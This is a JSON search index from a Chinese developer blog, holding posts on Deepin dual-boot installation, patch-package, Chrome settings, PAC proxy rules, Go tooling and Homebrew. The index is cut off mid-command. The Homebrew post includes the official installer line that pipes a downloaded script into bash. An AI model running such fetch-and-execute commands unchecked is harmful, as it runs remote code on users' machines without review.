用光标一直往下选择到蓝色的区域，然后回车，把“USB：\u0026hellip;.”调整为第一 保存更改且退出: 记住，按ESC退出时，要切换到 主菜单 -\u0026gt; 保存更改且退出，然后确认 3.重启安装 关机状态\n插入第1步制作的存储有 系统安装U盘启动盘 的U盘 打开 引导菜单 安装: 开机过程中，疯狂按 Fn + F9 (若引导菜单中没有看到你在BIOS步骤设置的USB：....，则尝试 同时按住 ESC键 重新刷新) 以下是成功刷新出 “USB启动盘”的截图: 注意: 如果还不成功，则尝试点击截图中的ESC，再重新设置BIOS后，重新进入 引导菜单 安装: 参考 如何安装国产操作系统深度deepin系统（超详细）。有以下几个比较重要的点 选择: 手动安装 或 全局安装 新建分区 i. 把挂载点: 选为/ 文件格式: 选择ext4 常见问题 1.“引导菜单”选中\u0026quot;USB: XXX\u0026quot;启动盘安装，\u0026ldquo;安全引导\u0026quot;报错 具体报错: \u0026ldquo;选定的启动映像未进行验证。请按 Enter键尝试引导至下一个设备\u0026rdquo;\n解决办法：关闭 安全-\u0026gt;安全引导配置-\u0026gt;安全启动 2.如何配置，保证在重启时，可选择双系统 待确认 BIOS 启动引导，切换回： Windows manage\nwindows + R -\u0026gt; msconfig windows系统里，以管理员权限运行cmd， 输入: bcdedit /set {bootmgr} path \\EFI\\deepin\\grubx64.efi 参考 deepin安装指南: 官方 如何安装国产操作系统深度deepin系统（超详细） 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/deepin-install/","summary":"\u003cp\u003e因为Linux的桌面发行版比较多，个人更加倾向于Debian系统，曾经折腾过deepin国产操作系统，所以此次仍然选择了deepin。本文主要介绍的是基于Windows系统上，安装Deepin系统社区20.9版本的整个过程\u0026hellip;\u003c/p\u003e","title":"Linux: 基于Windows，安装Deepin（深度）双系统"},{"content":"日常团队协作过程中，由于现状不得不使用相对滞后版本的依赖包，但又期望使用新版本的某些功能\u0026hellip;\n一、背景 通常情况下，遇到需要支持的底层功能，开发人员直接升级依赖包版本即可，但总有意外。比如:\n日常团队协作开发不同于个人独立开发，因为历史原因，不得不使用某个依赖包相对滞后的某个版本，但又需要新版本依赖包的某些功能。 新版本包存在未知的bug，但你的团队期望使用新版本中的某些已验证功能。 依赖包已经更新到最新版本，但存在官方未修复的bug。 此时，往常一波愉快的依赖包版本升级已经不能解决问题了。我们不得不祭出**“打补丁大法”**。\n二、patch-package打补丁 1.生成补丁 I. 安装 patch-package\n# 安装 patch-package $ npm i patch-package --save-dev II. 修改npm包 以我本次需求为例，我当前需要打补丁的包是@vant/cli 5.1.0，无论是新老版本都没有支持我需要的功能。所以，\n打开目标项目工程(A)/node_modules文件夹，确认版本是5.1.0 稳妥起见，打开一个废弃的前端工程(B)，安装@vant/cli 5.1.0（我这里偷懒使用的项目工程），打开node_modules/@vant/cli目录 场景1: 将你期望的新版本对应功能，复制粘贴到当前工程(B)对应node_modules/xxx目录文件内 场景2: 自行修复bug或diy你期望的功能，到当前工程(B)node_modules/xxx对应目录文件内 npm run dev启动工程(B)，测试功能是否满足期望。 III. 生成补丁文件\n功能符合预期，此时cd到工程(B)根木录下，执行如下命令生成补丁文件：\n$ npx patch-package @vant/cli 终端可看到执行记录如下:\n$ npx patch-package @vant/cli patch-package 6.4.7 • Creating temporary folder • Installing @vant/cli@5.1.0 with npm • Diffing your files with clean files ✔ Created file patches/@vant+cli+5.1.0.patch 💡 @vant/cli is on GitHub! To draft an issue based on your patch run npx patch-package @vant/cli --create-issue 最终在工程(B)根目录下，生成工程(B)/patches/@vant+cli+5.1.0.patch补丁文件，将它提交到git中。\n补丁原理也不复杂，其实就是一些git diff记录描述: patch-package会将当前node_modules下的源码与原始源码进行git diff，并在项目根目录下生成一个patch补丁文件。以我当前的为例:\ndiff --git a/node_modules/@vant/cli/site/index.html b/node_modules/@vant/cli/site/index.html index 5764eed..e32fb9e 100644 --- a/node_modules/@vant/cli/site/index.html +++ b/node_modules/@vant/cli/site/index.html @@ -33,5 +33,8 @@ \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;/desktop/main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; + \u0026lt;script\u0026gt; + window.localStorage.setItem(\u0026#34;vantTheme\u0026#34;, \u0026#34;light\u0026#34;) + \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; diff --git a/node_modules/@vant/cli/site/mobile.html b/node_modules/@vant/cli/site/mobile.html index e5ff77b..084a028 100644 --- a/node_modules/@vant/cli/site/mobile.html +++ b/node_modules/@vant/cli/site/mobile.html @@ -42,5 +42,8 @@ \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;/mobile/main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; + \u0026lt;script\u0026gt; + window.localStorage.setItem(\u0026#34;vantTheme\u0026#34;, \u0026#34;light\u0026#34;) + \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 2.执行补丁 基于以上操作，切回到目标项目工程(A)，在package.json中添加命令如下:\n{ \u0026#34;scripts\u0026#34;: { \u0026#34;postinstall\u0026#34;:\u0026#34;patch-package\u0026#34; // 会在包安装完成后执行 } } 执行依赖安装 -\u0026gt; 构建发布，符合预期。\n$ npm i install 依赖包 ... \u0026gt; @zto/mzui@3.1.1-beta.1 patch \u0026gt; patch-package patch-package 6.4.7 Applying patches... @vant/cli@5.1.0 ✔ ... patch-package finished. 三、其他方式 想要单纯修改npm包还有其他方式。\n1.对于单文件 拷贝覆盖法 修改引用法 利用postinstall勾子，执行cp 修改过的文件 ./node_modules/包名/原始文件，最终node_modules下的文件被覆盖成修改后的文件:\n{ \u0026#34;scripts\u0026#34;: { // 即每次install包后用修改后文件覆盖原始文件 \u0026#34;postinstall\u0026#34;: \u0026#34;cp ./patches/vant-cli/* ./node_modules/vant/cli/site\u0026#34; } } 配置一个webpack alias别名，如**\u0026lsquo;原始文件的引用路径\u0026rsquo;: \u0026lsquo;修改后文件的引用路径\u0026rsquo;**，使得最终修改后的文件被引用，如：\n// vite 原理类似 resolve: { alias: { \u0026#39;antd/upload\u0026#39;: path.resolve(__dirname, \u0026#39;./patched/upload/*\u0026#39;), } } 2.多个文件/整体项目 直接使用完成的源码，不再通过npm包方式引用 修改后的源码，发布到私有的npm仓库上，供项目使用 总结 patch-package优势: 使用git diff来记录补丁，比重写一份源码的方法更节省空间、安全和便捷 patch-package可在日常开发中优雅的解决鱼和熊掌不可兼得的难题。但问题出现时，最好还是从官方渠道寻求解决方案，如提issue并关注版本更新和bug修复情况，以便及时更新或者移除补丁。 参考 手把手教你使用patch-package给npm包打补丁 npm scripts 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/npm-package-patch/","summary":"\u003cp\u003e日常团队协作过程中，由于现状不得不使用相对滞后版本的依赖包，但又期望使用新版本的某些功能\u0026hellip;\u003c/p\u003e","title":"Node: 使用patch-package或其他方式给npm包打补丁"},{"content":"Markdown文档在日常和项目开发中已经成为必不可少的存在\u0026hellip;\n一、终端应用 1.\u0026ldquo;本地\u0026quot;应用 Typora: 对于Mac终端非常友好 VsCode（推荐）: 代码编辑器。 2.\u0026ldquo;云\u0026quot;应用 有道云笔记（推荐）: 对于多端（PC、移动端和Pad）同步非常友好。 Gitee / GitHub: vscode中使用Markdown All in One拓展，可自动生成toc目录。使用方式参考 VSCode 插件使用 Gitee本身已支持toc目录 二、项目开发 1.hugo 依赖go。适用于blogs搭建\n具体使用，可参考:\n工具: Hugo语法纪要 | Blogs GitHub Action + Hugo 自动构建发布个人博客 | Blogs GitHub Action + Gitee 构建同步国内和国外站点 | Blogs 2.docsify-cli 仅依赖npm或yarn\nhttps://www.npmjs.com/package/docsify-cli\n3.vitepress 依赖vite\nhttps://www.npmjs.com/package/vitepress\n参考 \u0026hellip; 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/tools-docs-markdown/","summary":"\u003cp\u003e\u003ccode\u003eMarkdown\u003c/code\u003e文档在日常和项目开发中已经成为必不可少的存在\u0026hellip;\u003c/p\u003e","title":"工具:（Markdown）文档工具"},{"content":"记录一些Chrome浏览器的配置和问题\u0026hellip;\n一、配置 1.禁用Chrome的黑色模式/ Dark Mode Chrome 73+在应用中支持了「MacOS Mojave系统层面的黑色模式」，即系统设置为黑色模式时，Chrome会自动适应切换到Dark Mode\n深色模式确实很舒服，但在一些Web网页中，流程图之类的图表也是用黑色表示，在Dark Mode模式下就会出现看不清楚的情况。所以，需求“系统使用Dark Mode的情况下将Chrome的黑色禁用”:\n# 通过命令行中设置 defaults 值 defaults write com.google.Chrome NSRequiresAquaSystemAppearance -bool Yes # 如果想恢复默认，只需要将刚才设置的值删掉或者将 Yes 设置成 No $ defaults delete com.google.Chrome NSRequiresAquaSystemAppearance 参考: 禁用Chrome的黑色模式/ Dark Mode\n但又出现了一个新问题: Chrome的首页搜索框，应该是被「defaults设置」覆盖了，显示不出来了，解决办法是： 按照上面恢复NSRequiresAquaSystemAppearance设置。但「危险」操作。有的小伙伴，恢复了也没有立即生效，Chrome的首页搜索栏还是看不到。 推荐第2种（设置Chrome自身的颜色主题），方式如下: 注: 这种方式对大多数网页是有用的，但有一些基于GitBooks开发的或开发者自己设置了跟随系统主题的，最终还是无法更改。比如: http://www.webgl3d.cn/pages/c0b143/\n对浅色主题有强需求的话，想要彻底修改，目前来看只能修改「系统的主题颜色」。\n二、问题 待补充\u0026hellip;\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/36.chrome-setting/","summary":"\u003cp\u003e记录一些\u003ccode\u003eChrome\u003c/code\u003e浏览器的配置和问题\u0026hellip;\u003c/p\u003e","title":"浏览器: Chrome的配置和问题"},{"content":"SSR工具PAC模式 Adblock Plus Filters自定义规则\u0026hellip;\n相关文章：\nLinux: Deepin系统环境配置 / 科学上网 一、Adblock Plus Filters自定义规则 1. 常用SSR工具 shadowsocks v2ray 2. 自定义规则 常用规则:\n# 1.通配符 * — 走代理 # 表示任何字符串，任何满足条件的都走代理。如: *.example.com/* 匹配: https://www.example.com https://image.example.com https://image.example.com/abcd # 2.例外规则 @@ — 不走代理 # 任何满足@@后面规则的地址，都不走代理。如: @@*.example.com/\\* 匹配: https://www.example.com https://image.example.com https://image.example.com/abcd # 3. || 标记 # 只匹配域名的结尾 —— 走代理 ||example.com # 4. | 标记 # 匹配地址的开头和结尾 —— 走代理 |https://example.com # 以https://example.com开头的地址 example.com| # 以example.com结尾的地址 # 5. ! 标记 # !后面的内容表示注释，以!开头的规则也会无效 GFW List内常用域名匹配白名单：\n# 可点击SSR软件的PAC配置，从GFW List名单查看更多： # 地址为: http://127.0.0.1:11085/pac/proxy.js # 走代理 ||github.com ||github.io ||jsdelivr.net .google.com ... # 不走代理 @@||aliyun.com @@||baidu.com @@||chinaso.com @@||chinaz.com @@||qq.com @@||sina.cn ... 3. 添加「用户自定义规则」到SSR PAC模式下，v2ray等会自动选择GFW List里的网址使用代理。但因为在「墙内」，你希望走代理访问的网址，可能不被包含在默认PAC列表里。所以，需要我们添加「用户自定义规则」来实现访问特定网站时走代理。\n(1) 示例规则Demo\n!走搭理的所有域名地址 ||google.* ||npmjs.com ||mozilla.* ||poe.com ||openai.com !不走代理的所有域名地址 @@||gitee.com @@||csdn.net @@||juejin.cn @@||leetcode.cn @@||webgl3d.cn !在职公司的域名地址 @@.baidu.com (2) 添加用户自定义规则\n打开SSR软件（v2ray、shadowsocks等）的PAC设置，添加上面(1)中的用户自定义demo规则。\n参考 Shadowsocks PAC模式自定义规则 ShadowSocks 自定义规则 Adblock Plus filters官方 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/vpn-ssr-adblock-filters/","summary":"\u003cp\u003eSSR工具PAC模式 Adblock Plus Filters自定义规则\u0026hellip;\u003c/p\u003e","title":"VPN: Adblock Plus Filters自定义规则"},{"content":"研究如何在基于Go的程序中使用WebSocket来做一些【实时】的事情\u0026hellip;\n一、什么是WebSocket 值得一提的是:\n为什么使用WebSocket? 它们与传统HTTP请求有何不同? WebSockets是升级后的HTTP【连接】，在连接被客户端或服务器终止之前一直存在。基于此，可以执行双工通信，从而使用这个单一连接从我们的客户端与服务器进行通信。\nWebSockets 的真正美妙之处在于它们总共使用了 1 个 TCP 连接，并且所有通信都是通过这个单一的长寿命 TCP 连接完成的。这大大减少了使用 WebSockets 构建实时应用程序所需的网络开销，因为不需要对 HTTP 端点进行持续轮询。\n二、搭建Websocket服务 1.使用Go搭建 $ go get github.com/gorilla/websocket 源码参考：go-gin-web 流程参考Golang 使用 Websocket 教程 三、测试Websocket服务 1.Websocket在线模拟请求工具 如：websocket通信地址\n注意：默认Get请求。若要发送json格式数据，则测试消息格式参考：\n{\u0026#34;ownerId\u0026#34;:1, \u0026#34;targetId\u0026#34;:6, \u0026#34;msgType\u0026#34;:1, \u0026#34;media\u0026#34;:1, \u0026#34;Content\u0026#34;:\u0026#34;hello, lianfei1\u0026#34;} 2.前端demo测试 function initWebsocket () { var url = \u0026#34;ws://\u0026#34; + location.host + \u0026#34;/chat?userId=\u0026#34; + userId() + \u0026#34;\u0026amp;token=\u0026#34; + util.parseQuery(\u0026#34;token\u0026#34;); this.webSocket = new WebSocket(url); //消息处理 this.webSocket.onmessage = function (evt) { console.log(\u0026#34;onmessage\u0026#34;, evt.data) if (evt.data.indexOf(\u0026#34;}\u0026#34;) \u0026gt; -1) { console.log(\u0026#34;recv json \u0026lt;==\u0026#34; + evt.data) this.onmessage(JSON.parse(evt.data)); } else { console.log(\u0026#34;recv\u0026lt;==\u0026#34; + evt.data) } }.bind(this) //关闭回调 this.webSocket.onclose = function (evt) { console.log(\u0026#34;您已自动下线\u0026#34;) //code 1006 } //出错回调 this.webSocket.onerror = function (evt) { console.log(evt.data) } /*{ this.webSocket.send() }*/ } 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-websocket/","summary":"\u003cp\u003e研究如何在基于\u003ccode\u003eGo\u003c/code\u003e的程序中使用\u003ccode\u003eWebSocket\u003c/code\u003e来做一些【实时】的事情\u0026hellip;\u003c/p\u003e","title":"Go: Websocket"},{"content":"常用的一些code fragment\u0026hellip;\n一、Golang 1.随机数 import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; ) ... // 随机数 // 1.rand.Intn() 函数是伪随机函数，因为它默认的资源是单一值，所以无论运行多少次都只会返回相同的随机数 // 2.如果需要每次运行产生不同的序列，须使用Seed函数初始化，且传入一个变化的值作为参数，如time.Now().Unix() rand.Seed(time.Now().Unix()) // 初始化随机数的资源库, 如果不执行这行, 不管运行多少次都返回同样的值 accountNo := \u0026#34;prefix_str\u0026#34; + strconv.Itoa(rand.Intn(max - min) + min) // 前缀为prefix_str的随机字符串 fmt.Println(\u0026#34;Hello accountNo\u0026#34;, accountNo) // UnixNano() // 将t表示为Unix时间，从时间点January 1, 1970 UTC到时间点t所经过的时间（单位纳秒）.如果纳秒为单位的unix时间超出了int64能表示的范围，结果是未定义的。意味着Time零值调用UnixNano方法的话，结果是未定义的 // 在windows下，rand.Seed(time.Now().UnixNano())作为种子，得出的随机数并不随机 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-codefragment/","summary":"\u003cp\u003e常用的一些\u003ccode\u003ecode fragment\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"代码片段：go"},{"content":"常用的一些code fragment\u0026hellip;\n一、JavaScript \u0026amp; ES6+ 1. Map转Object: const legSelectedMap = new Map(); legSelectedMap.set(\u0026#39;业务量1\u0026#39;, true) legSelectedMap.set(\u0026#39;业务量2\u0026#39;, false) legSelectedMap.set(\u0026#39;业务量3\u0026#39;, false) console.log([...legSelectedMap.entries()]); // 输出：Array [Array [\u0026#34;业务量1\u0026#34;, true], Array [\u0026#34;业务量2\u0026#34;, false], Array [\u0026#34;业务量3\u0026#34;, false]] let legSelected = [...legSelectedMap.entries()].reduce((obj, [key, value]) =\u0026gt; (obj[key] = value, obj), {}) console.log(legSelected); // 输出：Object { 业务量1: true, 业务量2: false, 业务量3: false } 二、Golang 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/js-es-ts-codefragment/","summary":"\u003cp\u003e常用的一些\u003ccode\u003ecode fragment\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"代码片段：js/es6+/ts"},{"content":"常用的一些code fragment\u0026hellip;\n一、JavaScript \u0026amp; ES6+ Map转Object:\nconst legSelectedMap = new Map(); legSelectedMap.set(\u0026#39;业务量1\u0026#39;, true) legSelectedMap.set(\u0026#39;业务量2\u0026#39;, false) legSelectedMap.set(\u0026#39;业务量3\u0026#39;, false) console.log([...legSelectedMap.entries()]); // 输出：Array [Array [\u0026#34;业务量1\u0026#34;, true], Array [\u0026#34;业务量2\u0026#34;, false], Array [\u0026#34;业务量3\u0026#34;, false]] let legSelected = [...legSelectedMap.entries()].reduce((obj, [key, value]) =\u0026gt; (obj[key] = value, obj), {}) console.log(legSelected); // 输出：Object { 业务量1: true, 业务量2: false, 业务量3: false } 二、Golang import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; ) ... // 随机数 // 1.rand.Intn() 函数是伪随机函数，因为它默认的资源是单一值，所以无论运行多少次都只会返回相同的随机数 // 2.如果需要每次运行产生不同的序列，须使用Seed函数初始化，且传入一个变化的值作为参数，如time.Now().Unix() rand.Seed(time.Now().Unix()) // 初始化随机数的资源库, 如果不执行这行, 不管运行多少次都返回同样的值 accountNo := \u0026#34;prefix_str\u0026#34; + strconv.Itoa(rand.Intn(max - min) + min) // 前缀为prefix_str的随机字符串 fmt.Println(\u0026#34;Hello accountNo\u0026#34;, accountNo) // UnixNano() // 将t表示为Unix时间，从时间点January 1, 1970 UTC到时间点t所经过的时间（单位纳秒）.如果纳秒为单位的unix时间超出了int64能表示的范围，结果是未定义的。意味着Time零值调用UnixNano方法的话，结果是未定义的 // 在windows下，rand.Seed(time.Now().UnixNano())作为种子，得出的随机数并不随机 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/32.code-fragment/","summary":"\u003cp\u003e常用的一些\u003ccode\u003ecode fragment\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"代码片段：js/es6+/ts/go"},{"content":"Go基础命令示例\u0026hellip;\n一、Go版本升级 $ brew search go # 第一种方式：重新安装 $ brew install go@1.19 # 安装指定版本 $ brew link go@1.19 --force # 第二种方式：升级 $ $ brew upgrade go $ go version 二、项目develop环境配置 $ go version # 查看版本 $ go help $ go env # 查看环境变量 $ go env | grep [env_name] # 例：go env |grep GOPROXY 查看GOPROXY配置 $ go env -w GOPROXY=https://goproxy.cn,direct # 设置国最内的Go模块代理 $ go env -w GO111MODULE=on # on/off/auto $ go env -w GOPATH=/Users/lianpf/go # 设置GOPATH 这里也可以编辑 ~/.bash_profile参考，去更改环境变量。\n三、项目module管理 1.初始化 \u0026amp; 运行 # module_name可以是远程的示例如example/hello，也可以是自己定义的package name $ go mod init [module_name] # 初始化项目 $ go mod tidy # 依赖go.mod文件安装依赖缺失的包，移除没用的包 $ go get github.com/go-sql-driver/mysql # 安装特定package $ go run main.go # 运行go文件 $ go run . 2.管理包: go mod $ go mod download # 下载模块到本地缓存，缓存路径是 $GOPATH/pkg/mod/cache $ go mod edit # 提供命令版编辑 go.mod 的功能，例如 go mod edit -fmt go.mod 会格式化 go.mod $ go mod graph # 把模块间的依赖图显示出来 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-basic-commands/","summary":"\u003cp\u003e\u003ccode\u003eGo\u003c/code\u003e基础命令示例\u0026hellip;\u003c/p\u003e","title":"Go: Basic Commands(基础命令)"},{"content":"go 使用多模块工作区，让开发者可同时处理多个模块的\u0026hellip;\n一、使用go work go 使用多模块工作区，让开发者可同时处理多个模块的开发。在Go 1.17之前，只能使用go.mod replace指令实现，虽然支持同时进行多个模块的开发，但使用它可能是很痛苦的。每次当你想要提交代码时，都不得不删除掉 go.mod中的replace才能使模块稳定的发布。\n在go 1.18后，官方提供了多模块工作区功能，即go work。\n1. 使用条件 需要go 1.18或更高版本 # 查看 go 版本 $ go version go version go1.18 darwin/amd64 2.go work支持命令 通常情况下，建议不要提交go.work文件到git 上，它主要用于本地代码开发 生成go.work文件：推荐在$GOPATH路径下执行 注意：若你的开发空间不在$GOPATH下，则在你的实际workspace根目录下执行初始化 init工作区文件：\n# 查看我的 GOPATH $ go env | grep GOPATH GOPATH=\u0026#34;/Users/xxx/go\u0026#34; # 查看我的某个 workspace go $ pwd /Users/xxx/gitHub/lian/go go $ go work init # 初始化，生成 go.work工作区文件 go $ tree 【黄色】标识go-gin-web是在go这个当前workspace下的一个项目，同级的还有另外一个项目go-grammar\n【红色】标识内的go.work和go.work.sum是我们init后，写入的初始化工作区文件。二者在workspace根目录，与go-gin-web同级。\n添加新的模块到工作区：go work use $ go work use ./example # 添加一个模块到工作区 $ go work use ./example ./example1 # 添加多个模块到工作区 $ go work use -r ./example # 递归 ./example 目录到当前工作区 # 删除命令 $ go work edit -dropuse=./example # 查看当前工作区文件路径，排查工作区文件是否设置正确 $ go env GOWORK /Users/xxx/gitHub/lian/go/go.work 3.go.work文件结构 和go.mod文件结构类似，支持Go版本号、指定工作区和需要替换的仓库 文件结构示例: 参考 Go 1.18 新特性多模块工作区教程-让多模块开发变得简单 | Go语言中文网 Go 多模块工作区文档、代码示例获取地址 | GitHub 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-work/","summary":"\u003cp\u003ego 使用多模块工作区，让开发者可同时处理多个模块的\u0026hellip;\u003c/p\u003e","title":"Go: 多模块工作区 go work"},{"content":"Homebrew是使用 Mac OS 的一件利器，Homebrew可以安装 Apple没有预装但非常\u0026hellip;\n一、Homebrew的管理 1.brew安装更新 Homebrew官网\nHomebrew是使用 Mac OS 的一件利器，Homebrew可以安装 Apple没有预装但非常需要的东西。Homebrew 会将软件包安装到独立目录，并将其文件软链接至/usr/local\n安装指令:\n$ /bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; Homebrew管理：\n$ brew --version $ brew update # 更新 Homebrew 自己 $ brew update-reset # 更新重置 2.镜像源和代理 Homebrew 安装速度较慢，可能的问题是：\n镜像: Homebrew默认软件源，因为地区或网络环境下速度较慢 代理 2.1 更换软件源 查看当前的镜像源 $ brew config # 查看 Homebrew 的镜像源配置 # 输出结果中可看到两个配置项: 表示 Homebrew 的 Git 远程仓库源链接，用于下载软件包和更新 # ORIGIN: https://github.com/Homebrew/brew.git # Core tap origin: https://github.com/Homebrew/homebrew-core 尝试切换到其他镜像源，如清华大学、中科大等提供的镜像源。以下是切换镜像源的步骤：\nI. 打开终端应用程序 II. 运行以下命令替换Homebrew默认的镜像源 国内镜像地址:\n科大: https://mirrors.ustc.edu.cn 阿里: https://mirrors.aliyun.com/homebrew 华为: https://mirrors.huaweicloud.com/homebrew 官方: https://github.com/Homebrew Homebrew的配置分成三个目录，分别是:\nbrew（brew --repo）: 主要配置目录，用于存储 Homebrew 的核心库和工具。 默认位置：/usr/local/Homebrew（对于 macOS 系统） homebrew/core（brew --repo homebrew/core）: 存储 Homebrew Core 的软件包信息和公式（Formula），它包含了大量常见的开源软件包，如常用的命令行工具和实用程序 默认位置：/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core homebrew/cask（brew --repo homebrew/cask）: 存储 Homebrew Cask 的应用程序信息和 Cask 文件 默认位置：/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask # 通过git remote get-url origin来查看当前的源的URL $ git -C \u0026#34;$(brew --repo)\u0026#34; remote get-url origin # 输出: https://github.com/Homebrew/brew.git $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote get-url origin $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote get-url origin # 1.通过以下三个命令修改Homebrew源配置为默认值，2.更新 $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin \u0026#39;https://mirrors.ustc.edu.cn/brew.git\u0026#39; $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin \u0026#39;https://mirrors.ustc.edu.cn/homebrew-core.git\u0026#39; # 可忽略: homebrew/cask 非必要可不替换 # $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote set-url origin \u0026#39;https://mirrors.ustc.edu.cn/homebrew-cask.git\u0026#39; $ brew update # 更新 第二种更换镜像源的方式: 编辑~/.bash_profile文件\n# bash 替换 brew bintray 镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile $ source ~/.bash_profile # 刷新源(执行改条时,执行时间可能比较长,请耐心等待) $ brew update 2.2 代理服务器 如果在访问外部网络时需要代理服务器，可在终端中配置相应的代理设置，以加速 Homebrew 的安装。\n# 使用 `export` 命令设置 `http_proxy` 和 `https_proxy` 环境变量，将代理服务器的地址和端口配置为合适的值 export http_proxy=http://proxy.example.com:8888 export https_proxy=http://proxy.example.com:8888 请将 proxy.example.com 替换为你实际的代理服务器地址和端口。\n二、包的管理 1.包的更新 一味地更新Homebrew所有安装包可能带来依赖的不支持，建议每个月定期查看一下，有选择性地更新。\n# 列出已安装包 $ brew list # 安装包 $ brew search \u0026lt;package name\u0026gt; # brew search go：查找go的所有版本 # 安装指定包及其版本：brew install $FORMULA / brew install go@1.17 $ brew install \u0026lt;package name[@version]\u0026gt; $ brew uninstall \u0026lt;package name[@version]\u0026gt; # 更新 brew update —— 适用于更新镜像源后 $ brew update # 更新 Homebrew 自身和 Homebrew Core（命令行软件包）的信息，而不会更新已安装的软件包 # 更新 $ brew outdated # 查看哪些安装包需要更新 $ brew upgrade # 更新”已安装的“所有包 $ brew upgrade $FORMULA # 更新”已安装的“指定包 # 删除 $ brew rm $FORMULA # 删除某个包 $ brew uninstall --force $FORMULA # 删除所有版本 # 清理旧版本 $ brew cleanup # 清理所有包的旧版本 $ brew cleanup $FORMULA # 清理指定包的旧版本 $ brew cleanup -n # 查看可清理的旧版本包，不执行实际操作 # 锁定不想更新的包 $ brew pin $FORMULA # 锁定某个包 $ brew unpin $FORMULA # 取消锁定 # 查看安装包的相关信息 $ brew info $FORMULA # 显示某个包的信息 $ brew info # 显示安装了包数量，文件数量，和总占用空间 $ brew deps --installed --tree # 查看已安装的包的依赖，树形显示 2.包（镜像源）异常 特别适用于切换镜像源后，或其他情况下突然拉取包失败\n# 依次尝试以下命令 $ brew doctor $ brew update-reset $ brew update 三、常见问题 1.Version value must be a string 解决：\n$ brew update-reset # 更新重置 $ brew update # 更新 2.切换镜像源报错: cannot change to '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask': No such file or directory 使用命令$ git -C \u0026quot;$(brew --repo 